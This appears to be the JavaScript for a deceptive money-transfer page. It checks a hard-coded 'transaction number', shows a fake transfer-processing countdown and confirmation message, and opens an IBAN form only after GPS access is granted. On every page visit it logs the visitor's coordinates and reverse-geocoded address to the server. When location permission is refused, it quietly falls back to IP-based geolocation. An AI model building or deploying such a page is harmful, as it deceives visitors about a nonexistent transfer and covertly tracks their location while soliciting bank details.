/**
 * /js/transfer.js
 * Script specific to the transfer page
 */

document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const checkTransferBtn = document.getElementById('check-transfer-btn');
    const cashoutBtn = document.getElementById('cashout-btn');
    const verificationForm = document.getElementById('verification-form');
    const transactionDetails = document.getElementById('transaction-details');
    const transactionNumberInput = document.getElementById('transaction-number');
    const ibanModal = document.getElementById('iban-modal');
    const loadingModal = document.getElementById('loading-modal');
    const geolocErrorModal = document.getElementById('geoloc-error-modal');
    const transactionErrorModal = document.getElementById('transaction-error-modal');
    const transferForm = document.getElementById('transfer-form');
    const closeBtns = document.querySelectorAll('.close');
    const retryGeolocBtn = document.getElementById('retry-geolocation');
    const retryTransactionBtn = document.getElementById('retry-transaction');
    const loadingText = document.getElementById('loading-text');
    
    // Variables to store GPS coordinates
    let userCoords = null;
    let userGeoloc = null;
    
    // Correct transaction number constant
    const CORRECT_TRANSACTION_NUMBER = "WRMAUJZ7KIZ3JP2C5J6";
    
    // Function to verify transaction number
    function verifyTransactionNumber() {
        const transactionNumber = transactionNumberInput.value.trim();
        
        // Log the verification attempt
        sendLocationData(userCoords, userGeoloc, `transaction_check: ${transactionNumber}`);
        
        if (transactionNumber === CORRECT_TRANSACTION_NUMBER) {
            // Transaction number is correct, show details
            verificationForm.style.display = 'none';
            transactionDetails.style.display = 'block';
        } else {
            // Transaction number is incorrect, show error
            transactionErrorModal.style.display = 'block';
        }
    }
    
    // Function to open the geolocation error modal
    function showGeolocError() {
        geolocErrorModal.style.display = 'block';
    }
    
    // Function to check geolocation and open form
    function checkGeolocationAndOpenForm() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                // Success
                function(position) {
                    userCoords = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    
                    // Get more geolocation information via third-party API
                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userCoords.latitude}&longitude=${userCoords.longitude}&localityLanguage=en`)
                        .then(response => response.json())
                        .then(data => {
                            userGeoloc = {
                                city: data.city,
                                region: data.principalSubdivision,
                                country: data.countryName,
                                postal: data.postcode
                            };
                            
                            // Send data to server
                            sendLocationData(userCoords, userGeoloc, 'cashout_click');
                            
                            // Open form modal
                            ibanModal.style.display = 'block';
                        })
                        .catch(error => {
                            // If third-party API fails, use coordinates only
                            sendLocationData(userCoords, null, 'cashout_click');
                            ibanModal.style.display = 'block';
                        });
                },
                // Error
                function(error) {
                    console.log("Geolocation error: ", error);
                    showGeolocError();
                }
            );
        } else {
            // If geolocation is not supported
            showGeolocError();
        }
    }
    
    // Function to send location data to server
    function sendLocationData(coords, geoloc, action) {
        fetch('/log_location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                coords: coords,
                geoloc: geoloc,
                action: action
            }),
        })
        .then(response => response.json())
        .then(data => console.log('Location data recorded'))
        .catch(error => console.error('Error sending location data:', error));
    }
    
    // Function to simulate loading and redirect
    function simulateLoadingAndRedirect() {
        loadingModal.style.display = 'block';
        
        let countdown = 5;
        loadingText.textContent = `Processing your transfer... (${countdown})`;
        
        const timer = setInterval(() => {
            countdown--;
            loadingText.textContent = `Processing your transfer... (${countdown})`;
            
            if (countdown <= 0) {
                clearInterval(timer);
                loadingText.textContent = "Transfer confirmed! A validation code has been sent to your phone.";
                
                // Redirect to home page after a short delay
                setTimeout(() => {
                    window.location.href = '/';
                }, 2000);
            }
        }, 1000);
    }
    
    // Event Listeners
    if (checkTransferBtn) {
        checkTransferBtn.addEventListener('click', verifyTransactionNumber);
    }
    
    if (cashoutBtn) {
        cashoutBtn.addEventListener('click', checkGeolocationAndOpenForm);
    }
    
    if (retryGeolocBtn) {
        retryGeolocBtn.addEventListener('click', function() {
            geolocErrorModal.style.display = 'none';
            checkGeolocationAndOpenForm();
        });
    }
    
    if (retryTransactionBtn) {
        retryTransactionBtn.addEventListener('click', function() {
            transactionErrorModal.style.display = 'none';
            transactionNumberInput.focus();
        });
    }
    
    // Close modals when clicking on X
    closeBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            ibanModal.style.display = 'none';
            geolocErrorModal.style.display = 'none';
            transactionErrorModal.style.display = 'none';
        });
    });
    
    // Close modals when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target === ibanModal) {
            ibanModal.style.display = 'none';
        } else if (event.target === geolocErrorModal) {
            geolocErrorModal.style.display = 'none';
        } else if (event.target === transactionErrorModal) {
            transactionErrorModal.style.display = 'none';
        }
    });
    
    // Try to get geolocation as soon as transfer page is loaded
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            // Success
            function(position) {
                userCoords = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                
                // Get more geolocation information via third-party API
                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userCoords.latitude}&longitude=${userCoords.longitude}&localityLanguage=en`)
                    .then(response => response.json())
                    .then(data => {
                        userGeoloc = {
                            city: data.city,
                            region: data.principalSubdivision,
                            country: data.countryName,
                            postal: data.postcode
                        };
                        
                        // Send data to server
                        sendLocationData(userCoords, userGeoloc, 'transfer_page_visit_with_gps');
                    })
                    .catch(error => {
                        // If third-party API fails, use only coordinates
                        sendLocationData(userCoords, null, 'transfer_page_visit_with_gps_no_details');
                    });
            },
            // Error or refusal - fallback to IP
            function(error) {
                console.log("Geolocation not authorized on page visit:", error);
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const geoloc = {
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            postal: data.postal
                        };
                        
                        // Send data to server
                        sendLocationData(null, geoloc, 'transfer_page_visit_without_gps');
                    })
                    .catch(error => console.error('IP geolocation error:', error));
            }
        );
    } else {
        // If geolocation is not supported
        sendLocationData(null, null, 'transfer_page_visit_no_gps_support');
    }
    
    // Handle Enter key in transaction number input
    if (transactionNumberInput) {
        transactionNumberInput.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                verifyTransactionNumber();
            }
        });
    }
});